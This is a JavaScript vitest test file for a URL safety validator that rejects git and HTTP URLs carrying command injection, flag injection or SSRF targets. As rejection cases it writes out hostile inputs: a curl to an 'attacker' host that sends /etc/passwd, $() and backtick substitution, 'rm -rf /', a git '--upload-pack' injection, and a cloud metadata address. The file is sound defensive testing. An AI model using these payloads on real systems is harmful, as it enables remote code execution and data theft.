import { describe, it, expect } from 'vitest';
import { isSafeRemoteUrl, isSafeHttpUrl, isPrivateHost, extractRemoteHost } from './safe-url.js';

describe('isSafeRemoteUrl', () => {
  it('accepts legitimate git remote forms', () => {
    for (const url of [
      'https://github.com/user/repo.git',
      'http://gitlab.example.com/group/repo',
      'git://github.com/user/repo.git',
      'ssh://git@github.com/user/repo.git',
      'git@github.com:user/repo.git',
      'github.com/user/repo',
    ]) {
      expect(isSafeRemoteUrl(url), url).toBe(true);
    }
  });

  it('rejects command-injection payloads (the RCE the fix closes)', () => {
    for (const url of [
      'http://example.com/x; curl http://attacker/$(cat /etc/passwd) #',
      'https://example.com/`whoami`',
      'https://example.com/$(reboot)',
      'https://example.com/a|b',
      'https://example.com/a&&b',
      'https://example.com/a\nrm -rf /',
      'https://example.com/a b', // whitespace
    ]) {
      expect(isSafeRemoteUrl(url), url).toBe(false);
    }
  });

  it('rejects flag-injection (leading dash) and non-network schemes', () => {
    expect(isSafeRemoteUrl('--upload-pack=touch /tmp/pwned')).toBe(false);
    expect(isSafeRemoteUrl('-oProxyCommand=evil')).toBe(false);
    expect(isSafeRemoteUrl('file:///etc/passwd')).toBe(false);
    expect(isSafeRemoteUrl('data:text/plain,hi')).toBe(false);
    expect(isSafeRemoteUrl('/etc/passwd')).toBe(false);
    expect(isSafeRemoteUrl('./local/path')).toBe(false);
  });

  it('rejects non-strings, empty, and over-long input', () => {
    expect(isSafeRemoteUrl(undefined)).toBe(false);
    expect(isSafeRemoteUrl(null)).toBe(false);
    expect(isSafeRemoteUrl(42)).toBe(false);
    expect(isSafeRemoteUrl('')).toBe(false);
    expect(isSafeRemoteUrl('https://example.com/' + 'a'.repeat(600))).toBe(false);
  });

  it('blocks private/loopback/metadata hosts when asked (SSRF)', () => {
    const opts = { blockPrivateNetworks: true };
    for (const url of [
      'http://127.0.0.1/x/y',
      'http://169.254.169.254/latest/meta-data/',
      'http://10.0.0.5/x/y',
      'http://192.168.1.10/x/y',
      'http://172.16.0.1/x/y',
      'http://localhost/x/y',
      'ssh://git@[::1]/x/y',
    ]) {
      expect(isSafeRemoteUrl(url, opts), url).toBe(false);
    }
    // Public hosts still pass with the same flag on.
    expect(isSafeRemoteUrl('https://github.com/user/repo', opts)).toBe(true);
  });
});

describe('isPrivateHost', () => {
  it('classifies literal private and public hosts', () => {
    expect(isPrivateHost('127.0.0.1')).toBe(true);
    expect(isPrivateHost('169.254.169.254')).toBe(true);
    expect(isPrivateHost('10.1.2.3')).toBe(true);
    expect(isPrivateHost('172.31.255.255')).toBe(true);
    expect(isPrivateHost('172.32.0.1')).toBe(false); // just outside RFC1918
    expect(isPrivateHost('192.168.0.1')).toBe(true);
    expect(isPrivateHost('::1')).toBe(true);
    expect(isPrivateHost('localhost')).toBe(true);
    expect(isPrivateHost('8.8.8.8')).toBe(false);
    expect(isPrivateHost('github.com')).toBe(false);
  });
});

describe('isSafeHttpUrl', () => {
  it('accepts well-formed http/https endpoints', () => {
    expect(isSafeHttpUrl('https://peer.example.com/sync')).toBe(true);
    expect(isSafeHttpUrl('http://peer.example.com:7836/sync/v1')).toBe(true);
    expect(isSafeHttpUrl('https://peer.example.com')).toBe(true);
  });

  it('rejects non-http schemes, malformed, embedded creds, and over-long', () => {
    expect(isSafeHttpUrl('file:///etc/passwd')).toBe(false);
    expect(isSafeHttpUrl('ftp://example.com')).toBe(false);
    expect(isSafeHttpUrl('git@example.com:x/y')).toBe(false);
    expect(isSafeHttpUrl('not a url')).toBe(false);
    expect(isSafeHttpUrl('https://user:pass@example.com')).toBe(false); // inline creds
    expect(isSafeHttpUrl('https://example.com/' + 'a'.repeat(3000))).toBe(false);
    expect(isSafeHttpUrl(undefined)).toBe(false);
  });

  it('blocks SSRF targets when blockPrivateNetworks is set', () => {
    const opts = { blockPrivateNetworks: true };
    expect(isSafeHttpUrl('http://169.254.169.254/latest/meta-data/', opts)).toBe(false);
    expect(isSafeHttpUrl('http://127.0.0.1:8085/admin', opts)).toBe(false);
    expect(isSafeHttpUrl('http://10.0.0.1/x', opts)).toBe(false);
    expect(isSafeHttpUrl('http://192.168.1.1/x', opts)).toBe(false);
    expect(isSafeHttpUrl('http://localhost/x', opts)).toBe(false);
    // Public + Tailscale CGNAT (100.64/10) peers still allowed by default.
    expect(isSafeHttpUrl('https://peer.example.com/sync', opts)).toBe(true);
    expect(isSafeHttpUrl('http://100.101.102.103:7836/sync', opts)).toBe(true);
  });
});

describe('extractRemoteHost', () => {
  it('pulls the host from each accepted form', () => {
    expect(extractRemoteHost('https://github.com/u/r.git')).toBe('github.com');
    expect(extractRemoteHost('git@gitlab.com:u/r.git')).toBe('gitlab.com');
    expect(extractRemoteHost('github.com/u/r')).toBe('github.com');
    expect(extractRemoteHost('file:///etc/passwd')).toBe(null);
  });
});
